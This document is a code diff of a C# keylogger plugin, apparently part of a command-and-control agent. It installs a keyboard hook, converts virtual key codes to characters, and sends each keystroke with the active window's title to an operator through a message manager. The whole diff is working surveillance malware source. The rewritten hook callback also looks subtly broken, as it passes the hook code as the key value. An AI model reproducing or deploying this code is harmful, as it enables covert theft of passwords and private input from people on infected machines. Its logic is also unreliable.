@@ -1,5 +1,5 @@
-﻿using System.Diagnostics;
-using System.Runtime.InteropServices;
+﻿using System.Collections.Concurrent;
+using System.Diagnostics;
 using System.Text;
 using Agent.Interfaces;
 using Agent.Models;
@@ -7,12 +7,37 @@ using Agent.Utilities;
 
 namespace Agent
 {
+    public class Keystroke
+    {
+        public Keystroke(IntPtr hWin, int iKey)
+        {
+            windowHandle = hWin;
+            keyCode = iKey;
+        }
+        public int keyCode { get; set; }
+        public IntPtr windowHandle { get; set; }
+        public string GetWindowTitle()
+        {
+            StringBuilder title = new StringBuilder(256);
+            Native.GetWindowText(windowHandle, title, title.Capacity);
+
+            if (title.Length > 0)
+            {
+                return title.ToString();
+            }
+            return string.Empty;
+        }
+    }
+
     public class Plugin : IPlugin
     {
         public string Name => "keylogger";
         private bool isRunning = false;
         public string task_id = String.Empty;
         public CancellationTokenSource cts = new CancellationTokenSource();
+        private ConcurrentQueue<Keystroke> keyQueue = new ConcurrentQueue<Keystroke>();
+        private delegate void KeyboardEvent();
+        private event KeyboardEvent OnKbHappened;
         private IMessageManager messageManager { get; set; }
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
@@ -52,7 +77,7 @@ namespace Agent
         {
             this.isRunning = true;
             this.task_id = task_id;
-
+            this.OnKbHappened += Kl_OnKbHappened;
             try
             {
                 Native.HookProc callback = CallbackFunction;
@@ -78,370 +103,237 @@ namespace Agent
 
             return true;
         }
-        private async Task HandleKeyStroke(Int32 code, IntPtr wParam, IntPtr lParam)
+
+        private void Kl_OnKbHappened()
         {
-            Int32 msgType = wParam.ToInt32();
-            Int32 vKey;
-            string key = "";
-            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
+            Keystroke ks;
+
+            if (this.keyQueue.TryDequeue(out ks)) {
+                string key = ConvertKeyStroke(ks.keyCode);
+                messageManager.AddKeystroke(ks.GetWindowTitle(), this.task_id, key);
+            }
+            return;
+        }
+
+        private string ConvertKeyStroke(int ks)
+        {
+            string key = string.Empty;
+            bool shift = (Native.GetAsyncKeyState(0x10) & 0x8000) != 0;
+            bool caps = Console.CapsLock;
+
+            // Check if Key is an alphabet letter
+            if (ks > 64 && ks < 91)
             {
-                bool shift = false;
-                IntPtr hWindow = Native.GetForegroundWindow();
-                short shiftState = Native.GetAsyncKeyState(0x10);
-                if ((shiftState & 0x8000) == 0x8000)
+                if (shift | caps)
                 {
-                    shift = true;
-                }
-                var caps = Console.CapsLock;
-
-                // read virtual key from buffer
-                vKey = Marshal.ReadInt32(lParam);
-
-                // Parse key
-                if (vKey > 64 && vKey < 91)
-                {
-                    if (shift | caps)
-                    {
-                        key = ((Native.AthenaKeys)vKey).ToString();
-                    }
-                    else
-                    {
-                        key = ((Native.AthenaKeys)vKey).ToString().ToLower();
-                    }
-                }
-                else if (vKey >= 96 && vKey <= 111)
-                {
-                    switch (vKey)
-                    {
-                        case 96:
-                            key = "0";
-                            break;
-                        case 97:
-                            key = "1";
-                            break;
-                        case 98:
-                            key = "2";
-                            break;
-                        case 99:
-                            key = "3";
-                            break;
-                        case 100:
-                            key = "4";
-                            break;
-                        case 101:
-                            key = "5";
-                            break;
-                        case 102:
-                            key = "6";
-                            break;
-                        case 103:
-                            key = "7";
-                            break;
-                        case 104:
-                            key = "8";
-                            break;
-                        case 105:
-                            key = "9";
-                            break;
-                        case 106:
-                            key = "*";
-                            break;
-                        case 107:
-                            key = "+";
-                            break;
-                        case 108:
-                            key = "|";
-                            break;
-                        case 109:
-                            key = "-";
-                            break;
-                        case 110:
-                            key = ".";
-                            break;
-                        case 111:
-                            key = "/";
-                            break;
-                    }
-                }
-                else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
-                {
-                    if (shift)
-                    {
-                        switch (vKey)
-                        {
-                            case 48:
-                                key = ")";
-                                break;
-                            case 49:
-                                key = "!";
-                                break;
-                            case 50:
-                                key = "@";
-                                break;
-                            case 51:
-                                key = "#";
-                                break;
-                            case 52:
-                                key = "$";
-                                break;
-                            case 53:
-                                key = "%";
-                                break;
-                            case 54:
-                                key = "^";
-                                break;
-                            case 55:
-                                key = "&";
-                                break;
-                            case 56:
-                                key = "*";
-                                break;
-                            case 57:
-                                key = "(";
-                                break;
-                            case 186:
-                                key = ":";
-                                break;
-                            case 187:
-                                key = "+";
-                                break;
-                            case 188:
-                                key = "<";
-                                break;
-                            case 189:
-                                key = "_";
-                                break;
-                            case 190:
-                                key = ">";
-                                break;
-                            case 191:
-                                key = "?";
-                                break;
-                            case 192:
-                                key = "~";
-                                break;
-                            case 219:
-                                key = "{";
-                                break;
-                            case 220:
-                                key = "|";
-                                break;
-                            case 221:
-                                key = "}";
-                                break;
-                            case 222:
-                                key = "<Double Quotes>";
-                                break;
-                        }
-                    }
-                    else
-                    {
-                        switch (vKey)
-                        {
-                            case 48:
-                                key = "0";
-                                break;
-                            case 49:
-                                key = "1";
-                                break;
-                            case 50:
-                                key = "2";
-                                break;
-                            case 51:
-                                key = "3";
-                                break;
-                            case 52:
-                                key = "4";
-                                break;
-                            case 53:
-                                key = "5";
-                                break;
-                            case 54:
-                                key = "6";
-                                break;
-                            case 55:
-                                key = "7";
-                                break;
-                            case 56:
-                                key = "8";
-                                break;
-                            case 57:
-                                key = "9";
-                                break;
-                            case 186:
-                                key = ";";
-                                break;
-                            case 187:
-                                key = "=";
-                                break;
-                            case 188:
-                                key = ",";
-                                break;
-                            case 189:
-                                key = "-";
-                                break;
-                            case 190:
-                                key = ".";
-                                break;
-                            case 191:
-                                key = "/";
-                                break;
-                            case 192:
-                                key = "`";
-                                break;
-                            case 219:
-                                key = "[";
-                                break;
-                            case 220:
-                                key = "\\";
-                                break;
-                            case 221:
-                                key = "]";
-                                break;
-                            case 222:
-                                key = "<Single Quote>";
-                                break;
-                        }
-                    }
+                    key = ((Native.AthenaKeys)ks).ToString();
                 }
                 else
                 {
-                    switch ((Native.AthenaKeys)vKey)
-                    {
-                        case Native.AthenaKeys.F1:
-                            key = "<F1>";
-                            break;
-                        case Native.AthenaKeys.F2:
-                            key = "<F2>";
-                            break;
-                        case Native.AthenaKeys.F3:
-                            key = "<F3>";
-                            break;
-                        case Native.AthenaKeys.F4:
-                            key = "<F4>";
-                            break;
-                        case Native.AthenaKeys.F5:
-                            key = "<F5>";
-                            break;
-                        case Native.AthenaKeys.F6:
-                            key = "<F6>";
-                            break;
-                        case Native.AthenaKeys.F7:
-                            key = "<F7>";
-                            break;
-                        case Native.AthenaKeys.F8:
-                            key = "<F8>";
-                            break;
-                        case Native.AthenaKeys.F9:
-                            key = "<F9>";
-                            break;
-                        case Native.AthenaKeys.F10:
-                            key = "<F10>";
-                            break;
-                        case Native.AthenaKeys.F11:
-                            key = "<F11>";
-                            break;
-                        case Native.AthenaKeys.F12:
-                            key = "<F12>";
-                            break;
-
-                        //case Native.AthenaKeys.Snapshot:
-                        //    key = "<Print Screen>";
-                        //    break;
-                        //case Native.AthenaKeys.Scroll:
-                        //    key = "<Scroll Lock>";
-                        //    break;
-                        //case Native.AthenaKeys.Pause:
-                        //    key = "<Pause/Break>";
-                        //    break;
-                        case Native.AthenaKeys.INSERT:
-                            key = "<Insert>";
-                            break;
-                        //case Native.AthenaKeys.Home:
-                        //    key = "<Home>";
-                        //    break;
-                        case Native.AthenaKeys.DELETE:
-                            key = "<Delete>";
-                            break;
-                        //case Native.AthenaKeys.End:
-                        //    key = "<End>";
-                        //    break;
-                        //case Native.AthenaKeys.Prior:
-                        //    key = "<Page Up>";
-                        //    break;
-                        //case Native.AthenaKeys.Next:
-                        //    key = "<Page Down>";
-                        //    break;
-                        //case Native.AthenaKeys.Escape:
-                        //    key = "<Esc>";
-                        //    break;
-                        //case Native.AthenaKeys.NumLock:
-                        //    key = "<Num Lock>";
-                        //    break;
-                        //case Native.AthenaKeys.Capital:
-                        //    key = "<Caps Lock>";
-                        //    break;
-                        case Native.AthenaKeys.TAB:
-                            key = "<Tab>";
-                            break;
-                        case Native.AthenaKeys.BACK:
-                            key = "<Backspace>";
-                            break;
-                        case Native.AthenaKeys.ENTER:
-                            key = "<Enter>";
-                            break;
-                        case Native.AthenaKeys.SPACE:
-                            key = "<Space Bar>";
-                            break;
-                        case Native.AthenaKeys.LEFT:
-                            key = "<Left>";
-                            break;
-                        case Native.AthenaKeys.UP:
-                            key = "<Up>";
-                            break;
-                        case Native.AthenaKeys.RIGHT:
-                            key = "<Right>";
-                            break;
-                        case Native.AthenaKeys.DOWN:
-                            key = "<Down>";
-                            break;
-                        case Native.AthenaKeys.LMENU:
-                            key = "<Alt>";
-                            break;
-                        case Native.AthenaKeys.RMENU:
-                            key = "<Alt>";
-                            break;
-                        case Native.AthenaKeys.LWIN:
-                            key = "<Windows Key>";
-                            break;
-                        case Native.AthenaKeys.RWIN:
-                            key = "<Windows Key>";
-                            break;
-                        //case Native.AthenaKeys.LShiftKey:
-                        //    key = "<Shift>";
-                        //    break;
-                        //case Native.AthenaKeys.RShiftKey:
-                        //    key = "<Shift>";
-                        //    break;
-                        case Native.AthenaKeys.LCONTROL:
-                            key = "<Ctrl>";
-                            break;
-                        case Native.AthenaKeys.RCONTROL:
-                            key = "<Ctrl>";
-                            break;
-                    }
+                    key = ((Native.AthenaKeys)ks).ToString().ToLower();
                 }
-
-                StringBuilder title = new StringBuilder(256);
-                Native.GetWindowText(hWindow, title, title.Capacity);
-                messageManager.AddKeystroke(title.ToString(), this.task_id, key);
             }
+            else
+            {
+                switch (ks)
+                {
+                    case 8:
+                        key = "<Backspace>";
+                        break;
+                    case 9:
+                        key = "<Tab>";
+                        break;
+                    case 13:
+                        key = "<Enter>";
+                        break;
+                    case 32:
+                        key = "<Space Bar>";
+                        break;
+                    case 37:
+                        key = "<Left>";
+                        break;
+                    case 38:
+                        key = "<Up>";
+                        break;
+                    case 39:
+                        key = "<Right>";
+                        break;
+                    case 40:
+                        key = "<Down>";
+                        break;
+                    case 45:
+                        key = "<Insert>";
+                        break;
+                    case 46:
+                        key = "<Delete>";
+                        break;
+                    case 48:
+                        key = shift ? ")" : "0";
+                        break;
+                    case 49:
+                        key = shift ? "!" : "1";
+                        break;
+                    case 50:
+                        key = shift ? "@" : "2";
+                        break;
+                    case 51:
+                        key = shift ? "#" : "3";
+                        break;
+                    case 52:
+                        key = shift ? "$" : "4";
+                        break;
+                    case 53:
+                        key = shift ? "%" : "5";
+                        break;
+                    case 54:
+                        key = shift ? "^" : "6";
+                        break;
+                    case 55:
+                        key = shift ? "&" : "7";
+                        break;
+                    case 56:
+                        key = shift ? "*" : "8";
+                        break;
+                    case 57:
+                        key = shift ? "(" : "9";
+                        break;
+                    case 91:
+                        key = "<Windows Key>";
+                        break;
+                    case 92:
+                        key = "<Windows Key>";
+                        break;
+                    case 96:
+                    case 97:
+                    case 98:
+                    case 99:
+                    case 100:
+                    case 101:
+                    case 102:
+                    case 103:
+                    case 104:
+                    case 105:
+                        //Convert numpad keypress
+                        key = (ks - 96).ToString();
+                        break;
+                    case 106:
+                        key = "*";
+                        break;
+                    case 107:
+                        key = "+";
+                        break;
+                    case 108:
+                        key = "|";
+                        break;
+                    case 109:
+                        key = "-";
+                        break;
+                    case 110:
+                        key = ".";
+                        break;
+                    case 111:
+                        key = "/";
+                        break;
+                    case 112:
+                        key = "<F1>";
+                        break;
+                    case 113:
+                        key = "<F2>";
+                        break;
+                    case 114:
+                        key = "<F3>";
+                        break;
+                    case 115:
+                        key = "<F4>";
+                        break;
+                    case 116:
+                        key = "<F5>";
+                        break;
+                    case 117:
+                        key = "<F6>";
+                        break;
+                    case 118:
+                        key = "<F7>";
+                        break;
+                    case 119:
+                        key = "<F8>";
+                        break;
+                    case 120:
+                        key = "<F9>";
+                        break;
+                    case 121:
+                        key = "<F10>";
+                        break;
+                    case 122:
+                        key = "<F11>";
+                        break;
+                    case 123:
+                        key = "<F12>";
+                        break;
+                    case 162:
+                        key = "<Ctrl>";
+                        break;
+                    case 163:
+                        key = "<Ctrl>";
+                        break;
+                    case 164:
+                        key = "<Alt>";
+                        break;
+                    case 165:
+                        key = "<Alt>";
+                        break;
+                    case 186:
+                        key = shift ? ":" : ";";
+                        break;
+                    case 187:
+                        key = shift ? "+" : "=";
+                        break;
+                    case 188:
+                        key = shift ? "<" : ",";
+                        break;
+                    case 189:
+                        key = shift ? "_" : "-";
+                        break;
+                    case 190:
+                        key = shift ? ">" : ".";
+                        break;
+                    case 191:
+                        key = shift ? "?" : "/";
+                        break;
+                    case 192:
+                        key = shift ? "~" : "`";
+                        break;
+                    case 219:
+                        key = shift ? "{" : "[";
+                        break;
+                    case 220:
+                        key = shift ? "|" : "\\";
+                        break;
+                    case 221:
+                        key = shift ? "}" : "]";
+                        break;
+                    case 222:
+                        key = shift ? "<Double Quote>" : "<Single Quote>";
+                        break;
+                }
+            }
+
+            return key;
         }
         private IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
         {
-            HandleKeyStroke(code, wParam, lParam);
+            if (code >= 0 && (wParam == 0x100 || wParam == 0x104))
+            {
+                IntPtr hWindow = Native.GetForegroundWindow();
+                if (hWindow != IntPtr.Zero)
+                {
+                    Keystroke ks = new Keystroke(hWindow, code);
+                    this.keyQueue.Enqueue(ks);
+                    this.OnKbHappened?.Invoke();
+                }
+
+            }
             return Native.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
     }
 }
-
